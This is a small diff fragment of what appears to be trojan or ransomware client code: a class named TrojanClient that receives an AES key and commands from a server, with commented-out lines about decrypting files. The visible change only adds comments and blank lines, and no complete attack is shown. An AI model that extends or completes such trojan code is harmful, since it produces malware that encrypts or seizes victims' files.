@@ -119,6 +119,8 @@ class TrojanClient:
         self.connection = conn
 
     def handle_server(self):
+        # option 1:
+        
         # aes_key = protocol.receive(self.connection)
         # action = protocol.receive(self.connection).decode("utf-8")
 
@@ -135,7 +137,10 @@ class TrojanClient:
         #     protocol.send(self.connection, "the files are decrypted")
 
         # sys.exit()
-        
+
+
+
+        # option 2:
         aes_key = protocol.receive(self.connection)
         
         # encryption
